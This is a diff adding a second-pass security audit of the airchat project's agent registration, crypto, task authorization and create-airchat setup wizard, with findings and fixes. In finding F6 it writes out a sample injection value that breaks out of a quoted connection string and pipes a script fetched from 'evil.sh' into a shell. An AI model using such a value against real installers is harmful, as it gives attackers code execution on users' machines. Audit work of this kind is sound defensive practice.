@@ -117,6 +117,136 @@ to the columns it exists for, so the policy alone tells the truth.
 
 ---
 
+## Pass 2 — 2026-08-09 (deep read: crypto, registration, tasks, connector scopes)
+
+### F4. Deactivating an agent does not stop it — MEDIUM
+
+A deactivated agent reactivates itself on its very next request, with no
+operator involvement.
+
+```
+prune/admin sets active = false
+  → agent makes a request
+  → findAgentByDerivedKeyHash filters active = true  → 401
+  → the client re-registers  (as of #98 this actually happens)
+  → registerAgent UPDATEs on name + machine ownership … and sets active: true
+  → agent is back
+```
+
+`registerAgent`'s UPDATE has **no `active` filter**, so re-registration is also
+un-deactivation. Nothing in the flow distinguishes "this agent is new to me"
+from "an operator switched this agent off."
+
+**Pass 1 recorded the opposite, and was wrong.** The "verified clean" table
+below used to say deactivation *is* revocation. That was true only by accident:
+`register()` short-circuited on its on-disk key cache and never contacted the
+server, so the recovery path could not complete. Fixing that bug in #98 —
+correctly, it broke recovery for every agent with an invalidated key — removed
+the property. Worth stating plainly: a real fix silently cancelled a security
+property nobody had written down as depending on it.
+
+**Scope of the impact.** The actor needs the machine's Ed25519 private key, so
+this is not remote — it is the machine itself. What it costs is an operator
+control: there is currently no way to switch off an agent whose machine still
+holds its key, and `scripts/prune-agents.ts` is ineffective against anything
+still running. Three places document the opposite.
+
+**Options:**
+1. **Only set `active: true` on INSERT, not UPDATE.** One line. Deactivation
+   becomes durable, key rotation still works (the UPDATE still writes
+   `derived_key_hash`), and a disabled agent gets an honest, repeated 401
+   instead of silently resurrecting. Re-enabling becomes a deliberate act —
+   which is what the prune script already documents.
+2. **Separate `revoked` from `active`.** `active` stays a soft liveness/listing
+   flag that re-registration may clear; `revoked` is an operator kill switch
+   checked by both auth and registration. Correct model, needs a migration.
+3. Leave it and document that deactivation is cosmetic. **Reject** — a control
+   that looks like a kill switch and is not is worse than no control.
+
+**Recommendation: (1) now**, since it makes already-documented behaviour true
+for one line, with (2) if an explicit revoke is wanted later.
+
+### F5. The setup wizard writes the service-role key world-readable — MEDIUM
+
+`writeWebEnv()` in `packages/create-airchat/src/index.ts` writes
+`apps/web/.env.local` containing `SUPABASE_SERVICE_ROLE_KEY` and `DATABASE_URL`
+(password included) with **no `mode`**, so it lands at the umask default —
+normally `0644`. Any local user can read a key that bypasses every RLS policy.
+
+The same file gets this right everywhere else: `~/.airchat/config` is written
+`0o600`, the private key `0o600`, both directories `0o700`, each followed by an
+explicit `chmodSync`. This one write was simply missed.
+
+The explicit `chmod` matters as much as the mode: `writeFileSync`'s `mode`
+applies only when **creating** a file, so re-running setup over an existing
+`.env.local` would leave the old permissions in place regardless.
+
+**Fix:** `{ mode: 0o600 }` plus a `chmodSync`, matching the pattern already used
+five lines away. This ships in the npm package, so it needs a release.
+
+### F6. Connection strings are interpolated into shell commands — MEDIUM
+
+```ts
+execSync(`supabase db push --db-url "${config.supabaseUrl}"`, …)   // index.ts:352
+execSync(`psql "${config.databaseUrl}" -f "${…}"`, …)              // index.ts:395
+```
+
+Both values come from setup prompts and are pasted into a shell string with
+nothing but double quotes around them. A value containing `"` closes the quote
+and everything after it runs:
+
+```
+https://x.supabase.co" ; curl evil.sh | sh ; echo "
+```
+
+The user is already running an installer with their own privileges, which caps
+the severity — but *pasting a connection string someone gave you* is an
+completely ordinary act, and that is the vector. A string from a tutorial, a
+hosting provider's docs, a colleague, or a support reply becomes code
+execution. The same shape appears in the harness registration commands
+(`harnesses.ts:116,127`), where the interpolated paths derive from the
+user-supplied install directory.
+
+**Fix:** `execFileSync` with an argument array. It never invokes a shell, so
+quoting stops being something anyone has to get right. `binaryExists()` takes
+only fixed literals (`claude`, `codex`, …) and is fine either way.
+
+### R1. The Supabase migration loop does nothing, slowly — readability
+
+`index.ts:365-376` reads every migration file into memory, discards it, awaits
+an RPC hard-coded to resolve `{ error: null }` from both handlers, increments a
+counter, and then reports that the migrations still need applying by hand:
+
+```ts
+const sql = fs.readFileSync(…);              // never used
+const { error } = await supabase.rpc('', {}) // both branches: { error: null }
+  .then(() => ({ error: null }), () => ({ error: null }));
+applied++;                                    // counts files NOT applied
+```
+
+`applied` counting files that were not applied is the part that will mislead
+someone. The loop should list the files and say they need the SQL Editor, which
+is what it already concludes — without the file reads or the round trip.
+
+---
+
+## Verified clean in pass 2
+
+| Area | Result |
+|---|---|
+| `crypto.ts` | Ed25519 throughout. The signed message is a fixed-order JSON **array**, so there is no key-ordering ambiguity to exploit. 256-bit random derived keys, which is why plain SHA-256 storage is fine. `verifyRegistration` is wrapped at the call site, so a malformed key cannot 500. |
+| Registration flow | IP (10/min) and per-machine (5/min) rate limits, ±60s timestamp window, nonce replay check, per-machine agent cap. Machine-not-found and bad-signature return an **identical** 403, so the endpoint does not confirm which machines exist. |
+| Task authorization | `completeTask` requires `claimed_by = caller`; `cancelTask` requires `created_by = caller`; `claimTask` is a conditional UPDATE guarded on `status = 'open'`, so a race has exactly one winner. All three are conditional UPDATEs — no SELECT-then-UPDATE window. |
+| Connector token scopes | Enforced by construction: the per-request server is built with only the tools the scope allows, so a read token has no write tool to call. Tested against **every** write tool by name, an unrecognised scope degrades to read-only, and the two sets are asserted disjoint. |
+
+**Nonce replay, assessed and not a finding.** The nonce store is in-memory, so a
+restart or a second instance would not catch a replay. It does not matter: the
+signature covers `derived_key_hash`, so a replay can only re-assert the key
+already on the row. It cannot introduce one. (Reactivation is the exception,
+and that is F4 — reachable without a replay anyway.)
+
+---
+
 ## Verified clean in pass 1
 
 Recorded so later passes skip them. Each was checked, not assumed.
@@ -127,7 +257,7 @@ Recorded so later passes skip them. Each was checked, not assumed.
 | XSS | No `dangerouslySetInnerHTML` anywhere. |
 | SQL injection | No raw SQL, no string-interpolated queries, no `.rpc()` with user input. |
 | Path traversal | `validateStoragePath` rejects `..`, absolute paths and null bytes; uploads additionally blocked by a dangerous-MIME list (`text/html`, `image/svg+xml`, …) so a stored file cannot execute same-origin. |
-| Agent auth | `findAgentByDerivedKeyHash` filters `active = true` — deactivation **is** revocation, on both the v2 and connector paths. |
+| Agent auth | `findAgentByDerivedKeyHash` filters `active = true`, so a deactivated agent's key is refused on both the v2 and connector paths. ⚠️ **This row previously claimed deactivation is revocation. It is not — see F4.** The key is refused, and then re-registration turns the agent back on. |
 | RLS coverage | 21/21 tables. |
 | Federation | Envelope signatures mandatory, quarantine on failure, peer auto-suspend past a threshold, channel-namespace enforcement on inbound. |
 
@@ -160,10 +290,21 @@ pass mapped the surface and swept for known-shape vulnerabilities.
 3. **F3** — narrow the `agents` policy so it states its own intent.
 
 ### Phase 2 — deep reads, highest exposure first
-4. `packages/shared/src` — storage adapter and crypto. Everything trusts it.
-5. `create-airchat` — it runs on machines that are not ours.
-6. Route-by-route pass over `/api/v2` for IDOR and input validation.
-7. Migrations, policy by policy.
+4. ~~`packages/shared/src` — storage adapter and crypto.~~ **Started.** Crypto,
+   registration, task authorization and connector scopes read and clear; F4
+   found. The gossip adapter and the rest of the storage adapter remain.
+5. ~~`create-airchat` — it runs on machines that are not ours.~~ **Done** —
+   F5, F6, R1.
+6. Route-by-route pass over `/api/v2` for IDOR and input validation. *Not
+   started.*
+7. Migrations, policy by policy. *Not started.*
+
+### Decisions waiting on Duncan
+- **F4** — pick option 1 or 2. Until then there is no way to switch an agent
+  off.
+- **F3** — narrowing the `agents` policy needs a migration.
+- **F5/F6** — both are in the published npm package, so fixing them means
+  cutting a release.
 
 ### Phase 3 — readability and efficiency
 Deliberately last: a refactor before the security picture is settled makes
